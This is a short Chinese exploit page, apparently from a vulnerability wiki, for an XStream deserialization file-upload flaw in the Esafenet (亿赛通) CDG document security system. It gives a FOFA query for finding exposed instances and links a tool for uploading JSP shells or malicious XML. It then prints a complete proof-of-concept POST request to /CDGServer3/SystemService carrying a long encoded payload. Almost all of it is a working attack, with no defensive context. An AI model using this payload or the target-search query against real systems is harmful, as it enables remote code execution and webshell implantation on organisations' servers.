## 亿赛通电子文档安全管理系统XStream反序列化任意文件上传

## fofa
```
app="亿赛通-电子文档安全管理系统"
```

可使用以下工具直接上传JSP或自定义恶意XML。
`https://github.com/0xf4n9x/CDGXStreamDeserRCE`

## poc
```

POST /CDGServer3/SystemService?command=GETSYSTEMINFO HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8
Content-Type: text/xml
Host: 
Content-Length: 4582

NNLINELBIIKEOGPIFLNMHIPNNOHFNECLEHKBCIHIFHCMONPDPHOHMONIOCNLPBOKNAEEBHFCIFNMDPDAACABKCKIAEMBPOIBGPMNEIPJAOGBILDKMLDGAENLPAFBKFPFELKLGCEBMBMNKOIBMPHCIODCCEHOKPCEDHPNLONIODEGNCPIGDFMGMDPOMMEDIJNFKDCHHBFMFGBDOIOAHLOHNAMDBJABECIJOEHKAPJCBDIDJHKAMAGEELEHJEEIDBDILILANAKCIIGLMDIDDMOPNCNGLPPOMMIGCEFEBIMDHFAGLHIDHPJCHAEHFPHNHJGJKJDCINLAHOAPCDJNIABODKBFABJMFIEMLLPGGKNNNFCAOBHCOEOHCBFOFGBBPLKPHLLNOCJAKJDJPOEPBEKKPHOPBHFLJLNOGLABIJHIBOFFCPCLPAGLCEAONCAGIJFAEFOLKOLENHNFBOJIAOFJKBFMGNKBEECKKJPCECMFKPPPKEGOIOBHIBIBAGBIKAMOFLEKDKODMHGJOCEPEBNIHPFKEKKMCENNPHEODFNIOPMHFPPNFFIJEEJPPIMGPKHDOACKEEJACLCOKIPFHHECFDFJNMIFNGHLCOFLPDACOOALCNKBOEBPNPCKCKNJJJJANLFPKGLOINAIODAJNHAEDLBNONDJHPFELIJMNLMHEMBFGOHELCDBFHIFALDIIMBFEOHNHBOIOMLCJKCPHJPNDLPHDDCFJNMGKDMEINHIDLEGMOCNAFDAHOMPPIFFBPFCHAPPIDAIAILKODLCALBBJNPCGLPKIEOLEOMKEMBLMLBEGKNGCOKOFIPBCFAAHGCIMCAKFFLFIBDHCDFHMKKNDHLCGIMMNKMBJDGIDJMMGEOEGJNJDNNEKFDMEAHMILDKIFBGKGEJCMGOFEKGJEMNAFLDGEEOBKOHADBAMHBMDJOGIFPMDKIILIGAEELNEOAKNEFHDOGHOPBDICEALJIENFKHFCEHMPBJLCFPDHDGBBFIMKHLLFIHONFDJAIEJJLPPFMAEHBHDEBOIDLCMCIKAFBEBFEBGJEECDEINCPNPKIENONIMPBJCCMCHOAJHHDKDKEGJGDGJDJIDEHNNLNNHEONJEJHNLHLPMBBEJDLLJLLNPKIMGHLOFMMKBDEBHNFLPGEOKMHOFNBLLAALGMKNJONNGIOJLBFECJNLKHMBCKELDPBDMBFEHAKBHEMNDFBBEDCAMMHNNGMDGLNJHJDAGPILNGBEDCDJBCJOAMOBIFLOFCFIJKDELPPFLFBOHHEAIBHCEHALKGKJLIHHCLCCFBIKJPPCPFNEGBEFHIIEJLDLCIILGOJPCLALLDPIDJHNKDNPOGOMLIKGCBDNHJCLCGGGOMLKAEPNAGGHFCBGCALOHIGGKEHKPJNEBFGMJKCJFFDMMAHGEOFPIIPOIMALJHAFMLDLBBBOMCDBPJEHEJANCKCIEDBEIMIKONBEAMGGHGEFNOJGHKIELJBJLJCJFKCLOJEGIPPJOCNGCMBAKHADFNLEDMOJNMBGNGBMBFNPLIBGDCCNMDNDNOIPOECCPELCEDPGCNKGBDFKLJLNIJNAEFOPOLBLLCHOPIJCDNGEJGPMAFCFNLGKJDPKEBNDBEOIKINLEPIBJAGEBMEFKHPEKAPANDBGCGDBKKBJGFIOMHNPHOGAPDIFOBAMIGMNOFJAFJKNMFCBFNHAJELKBHCENAJDNEBNDCIOEOHAIOFKPEKJEPCDGPGGKENMHNOGKPMMADGIPOOJKHPGOIGDLNJFJGOIIEHCLGOLLGONJLFDBNMJCPJDDDKGDLKMCILLIEKBEDADHHJGENFBCKCACMIMIPDDGJFANEEFFILNPFMEEAOGCOFPPBCGCMEJDEHJILGKBDAKCPJMFODBFIEGHLPBLLGOHGABBGLENANFJGAEHBANPEHDNHLNDHKPCKMEOCOBFEJLDGJFDBIOHBMICIEDOHCDJMLKFFEHDJGOBLKLMOJHGOHHMNEJBEKCEEPAMBJFGNCBDDEJPGNGJKKGMKPJIIHDCFFPFAOMOGDKFGMMDLILPCDNCCGACMNDPCEJCCOAMKOCNAFDNELOFMFJIEEJLDJKOEFDIGHLJGKEFCKBGGKCFFCIBIGBDFABJCFOCEDNJOJEBAEMFIEFPNBKGKGKFJDDEBDMKFFEKKAJOFPDMFBBALPJHINILPDEEPIMJOHPLDMOFMFCFMEAAJDNIGJGAFDMONIMNMIBKIGGCMLPFGDFNKOBLDKIHEDJJFJNEEBGMDICECOLIJNPJBMHOGMBKMILAIMJCICMDNBGMFBKPEGHFCHDCKJCKMDKFDLAGLDAHOCOEKIELNHNONOOFECAMDJNOOPNIMPMCNKHNGEJJMKFDPOGGNJLLJDAKHABCOCLGBMNIAMFEKBEMCGIEMDMGCOEDBDOMPKLMMMKLFPGEINCENPLOMMOIJHINAIPDNPKFIHHFMNKFEJDLHILCDEEPALCCOLILJFIAGEJILLHDFIELENBAKNPEBNADDDHBNCHBPNPOFBIDKOAAJFPEMGIKMBLFBDJNMGCBHPONCBDPELPPMPGDLCDOENPCBGGFLHANCPOGKPPEMBNOKJHBPPDHDLNKJLKCAJAAEPLFPJJFEBCPALCOMNOMCIKJCFBMAKIOFPNPLJMOAJDCNMKDCFIPHLFGMNDILAMLFFEGDMBCFAKAFBEFPFFHOLABOICHGGHFGLHPBIHODABLCBFCNBFKEODJINOLGPDHNLBOFMBALOFPBMGAIDOLJJJEELGAPIGBCHOJBEKLNBCOMCGIPNOOPPOEJHCOOKJHNELONFDGHDAPBKAMPGHHOGNCPKCGMEAMLKOLAIHLIADDJPCDJKHFAAAJNKKEKNNEJDOENAFGNAHGOHCFDLMGHMKHNKOEDFJMANPFJAKOILOJEOBMBLAOIOEFAOGJJKLOMGLACMBBMEEHIMNHGLCIFBGOKFCJAMFFIEFLLKOGEELMKMPMAKJMMOFKDJCFJGCGBDGLKDCNLGJGAHOBIPMPIFJPOIBLLAHHOBHHPGDILOENAEPPKPLEOPKMLDBCELDMFLPAJEGEIFJPMJBKEMDENGPNPCDLEDFKMKBGNLKPENBBHDMGGHNMEHHMMOOMGDOEFGANFJDDIJBHJLEBMIMILDFBLCLDIIAECKJHECJGCFJIPMHIIIDGMFLIAEPDEPJPILNDOLFFHNJFICIJOLGMIEMIBBEBPOHKJCADKMCBMHBMEGBLKCFJNAGLBNCFCJJIFOJPAEDJCPJGGMDKBDMPAHHPEFOJHCGAHLHMCBOJOEHDNJAJCOKBGKJGFHKGGHIIIIMLKMJEFELFABKCLONJPBLAMBBPHKJBEDJLLALIMLIPJFBNEGFDHPILGPCGADBNDGMNKNMOEKCAKDNFDHGPJPEJAOEHFEOKCJAMGMPCKKPJFCHECMAGIECDFLHGAJOGAELCDHNODFAALBHLGPGGFDKHINKKEGCDEDKNFHDAHMLLFMBJLPEFNGBDKIBJDFHNJKKJMLPCPJDHFNDBHGBLMMHPCFAKEDCHNOECHCKOBBOJDGKDHIFANKMLFHDPPCOBKAPMJPMOGCPJLEEMNIKPPHLNEEMIKKFGGCBBFNAMADDKMFBFDONINLMAKGKMGKKAIMAEBCJMKILBGAGIKLFBLONMCHNEHGLDNKJFELODIKPCJMDBNFDMIHAPHJLGAIDLFPKLDNMDGNLCOMMLKICBDAOFPIKEOIGAEBGOPPJKBCMKHIFNGMJCCOFFMCIMOFPLCCMNCFPHHDPAAJALBNBCOJEPFCJFJEFFNGOJKFLHGHJNBFPLODCFLBLBEKINLDNONLCLEPEHOGKFCEPKLABDJOOOABGBOBMMLLMBGOOPGDJMBEEGINKGIGCHIIILBJJFJJNIDDJCHDDLOHELOLEANPLEEHCHDOKLEIBHAPFKPFAHNAIMDOKPCIKNEMFGMGCOGGMKBIBDEKDAKBPBJKPAFGODBFLGADBFNMDAHGLDGNFLLBONBDLAAOIIICMHIPDJCMHBGLFJAIMIBHABENMJOEHJLKGIIJDBBEHFJGKDNILPLLLHEJKJNGGDCADLNKNECJAGJLBFFAODGOMJNOPJIIEDEFBHLDLNAIBFDBJMJKFCLFOKBNCEKLKOEAEEDDMKNIEDBLJNKLAMJLOJFIJFMBOFNPMDEMBOHEDMJDGNEMGDAFFGJMPHLCGPAILFPPOLOAKOFJDMMILKLINJMIEDPFLIBNIPJMOOGNPLJNDJKJPNJKIKAMCKOMLKMELOCOFLDDJIEBGNBBLPMFNDGIHDEFAFHPJNAEPABGAOADKJMLCNLFMEPLIFKGJFPBBGHOCJDGPJFAKPIHNJJIPPBBIFJCIPGFNKBBLLGDOJGBPHKHELACOMFMJBCMEIALEBJEHDFLGPMMCEJIPIBIGGGLAMOKFKMKGJACLLNNHIPDJLHPNBJFMLBINBEOBJMLPILNJNNBLHMDHPNLONIODEGNCPIGDFMGMDPOMMEDIJNGFPFLJJMGANGAOLPGIFAFNEEACNKMJLFHEKBBILILPEGMIODENBNOOCENDGLDCKBGEFDCL
```
![19edd3710c23c5f7103a38c36915286f](https://github.com/wy876/wiki/assets/139549762/b1efcb1f-cea1-4e4a-b884-a152580b2cef)

![4966b17b9be5e46895ef5361adb14287](https://github.com/wy876/wiki/assets/139549762/2790fa86-9781-4fb2-91a6-df119d09234d)
